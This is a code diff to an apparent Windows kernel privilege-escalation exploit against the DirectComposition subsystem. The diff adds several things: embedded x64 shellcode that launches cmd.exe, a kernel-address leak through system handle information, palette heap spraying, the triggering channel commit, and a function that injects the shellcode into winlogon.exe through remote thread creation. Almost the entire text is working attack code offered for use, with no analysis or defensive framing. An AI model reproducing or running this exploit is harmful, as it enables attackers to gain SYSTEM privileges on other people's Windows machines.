@@ -62,6 +62,30 @@ typedef NTSTATUS(*pNtDCompositionCommitChannel)(
     IN HANDLE in2
     );
 
+unsigned char shellcode[] =
+"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
+"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
+"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
+"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
+"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
+"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
+"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
+"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
+"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
+"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
+"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
+"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
+"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
+"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
+"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
+"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
+"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
+"\x78\x65\x00";
+
+static const unsigned int shellcode_len = 0x1000;
+
+
+
 enum DCOMPOSITION_COMMAND_ID
 {
     ProcessCommandBufferIterator,
@@ -155,12 +179,50 @@ DWORD64 GetGadgetAddr(const char* name) {
 
 SIZE_T GetObjectKernelAddress(PEXPLOIT_CONTEXT pCtx, HANDLE object) {
     PSYSTEM_HANDLE_INFORMATION_EX handleInfo = NULL;
-    ULONG handleInfoSize = 0x1000;
-    ULONG retLength;
+    ULONG	handleInfoSize = 0x1000;
+    ULONG	retLength;
     NTSTATUS status;
     SIZE_T kernelAddress = 0;
     BOOL bFind = FALSE;
-    return 0;
+
+    while (TRUE)
+    {
+        handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);
+        status = pCtx->fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);
+        if (status == STATUS_INFO_LENGTH_MISMATCH || NT_SUCCESS(status)) {
+            LocalFree(handleInfo);
+            handleInfoSize = retLength + 0x100;
+            handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)LocalAlloc(LPTR, handleInfoSize);
+
+            status = pCtx->fnNtQuerySystemInformation(SystemExtendedHandleInformation, handleInfo, handleInfoSize, &retLength);
+
+            if (NT_SUCCESS(status)){
+                for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++){
+                    if ((USHORT)object == 0x4){
+                        if (0x4 == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)object == (SIZE_T)handleInfo->Handles[i].HandleValue){
+                            kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
+                            bFind = TRUE;
+                            break;
+                        }
+                    }
+                    else{
+                        if (GetCurrentProcessId() == (DWORD)handleInfo->Handles[i].UniqueProcessId && (SIZE_T)object == (SIZE_T)handleInfo->Handles[i].HandleValue){
+                            kernelAddress = (SIZE_T)handleInfo->Handles[i].Object;
+                            bFind = TRUE;
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+        if (handleInfo)
+            LocalFree(handleInfo);
+
+        if (bFind)
+            break;
+    }
+
+    return kernelAddress;
 }
 
 SIZE_T GetObjKernelAddress(PEXPLOIT_CONTEXT pCtx, HANDLE obj) {
@@ -255,7 +317,7 @@ BOOL InitEnvironment() {
     g_pExploitCtx->win32_process_offset = 0x508;
     g_pExploitCtx->previous_mode_offset = 0x232;
     g_pExploitCtx->GadgetAddrOffset = 0x38;
-    g_pExploitCtx->ObjectSize = 0x1d0;
+    g_pExploitCtx->ObjectSize = 0x1a0;
 
     return TRUE;
 }
@@ -263,7 +325,7 @@ HPALETTE createPaletteOfSize(int size) {
     int pal_cnt = (size + 0x8c - 0x90) / 4;
     int palsz = sizeof(LOGPALETTE) + sizeof(PALETTEENTRY) * (pal_cnt - 1);
     LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsz);
-    DWORD64* p = (DWORD64*)((DWORD)lPalette + 4);
+    DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);
 
     p[0] = (DWORD64)0xffffffff;
     p[3] = (DWORD64)0x04;
@@ -272,6 +334,48 @@ HPALETTE createPaletteOfSize(int size) {
     lPalette->palVersion = 0x300;
    
     return CreatePalette(lPalette);
+}
+
+void InjectWinLogon() {
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    
+    int pid = -1;
+    if (Process32First(snapshot, &entry)) {
+        while (Process32Next(snapshot, &entry)) {
+            if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0) {
+                pid = entry.th32ProcessID;
+                break;
+            }
+        }
+    }
+
+    CloseHandle(snapshot);  
+    if (pid < 0) {
+        printf("[-] Could not find  process\n");
+        return;
+    }
+    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!h) {
+        printf("[-] Could not open process: %d\n", pid);
+        return;
+    }
+
+    void* buffer = VirtualAllocEx(h, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!buffer) {
+        printf("[-] VirtualAllocEx fail\n");
+        return;
+    }
+    if (!WriteProcessMemory(h, buffer, shellcode, sizeof(shellcode), 0)) {
+        printf("[-] WriteProcessMemory failed\n");
+        return;
+    }
+    HANDLE hThread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);
+    if (hThread == INVALID_HANDLE_VALUE) {
+        printf("[-] CreateRemoteThread failed\n");
+        return;
+    }
 }
 int main(int argc, TCHAR* argv[])
 {
@@ -379,6 +483,13 @@ int main(int argc, TCHAR* argv[])
     }
     printf("[+] Binding Tracker1 to TrackerBinding2\n");
 
+
+    for (size_t i = 0; i < 0x5000; i++)
+    {
+        createPaletteOfSize(g_pExploitCtx->ObjectSize);
+    }
+
+
     *(DWORD*)pMappedAddress = nCmdReleaseResource;
     *(DWORD*)((PCHAR)pMappedAddress + 4) = Tracker1;
     ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x8, &dwArg1, &dwArg2);
@@ -392,6 +503,10 @@ int main(int argc, TCHAR* argv[])
     {
         createPaletteOfSize(g_pExploitCtx->ObjectSize);
     }
-
+    
+    DWORD out1;
+    BOOL out2;
+    BOOL in1 = FALSE;
+    NtDCompositionCommitChannel(hChannel, &out1, &out2, in1, NULL);
       
 }
